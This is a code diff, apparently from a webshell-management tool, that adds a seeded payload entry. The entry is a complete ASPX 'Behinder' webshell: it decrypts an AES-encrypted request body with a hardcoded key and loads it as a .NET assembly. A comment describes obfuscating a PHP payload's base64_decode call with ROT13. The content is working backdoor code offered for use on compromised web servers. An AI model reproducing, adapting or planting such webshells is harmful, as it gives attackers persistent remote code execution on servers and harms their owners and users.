@@ -292,6 +292,20 @@ class SeedService {
       names: ['jsp_behinder_mem.jsp'],
       newName: 'jsp_behinder_mem_servlet.jsp',
     ),
+    _PayloadPatch(
+      names: ['aspx_behinder.aspx'],
+      content:
+          '<%@ Page Language="C#" %>\n'
+          '<%@ Import Namespace="System.Reflection" %>\n'
+          '<%\n'
+          'Session.Add("k","42b842fc69195c9d");\n'
+          'byte[] k = Encoding.UTF8.GetBytes(Session[0] + "");\n'
+          'byte[] c = Request.BinaryRead(Request.ContentLength);\n'
+          'Assembly.Load(new System.Security.Cryptography.RijndaelManaged()'
+          '.CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length))'
+          '.CreateInstance("U").Equals(this);\n'
+          '%>\n',
+    ),
     // ── 内容修复 + 重命名 ────────────────────────────────────────────────
     // php_b64rot13：eval 不能作变量函数调用，改为 ROT13 混淆 base64_decode
     _PayloadPatch(
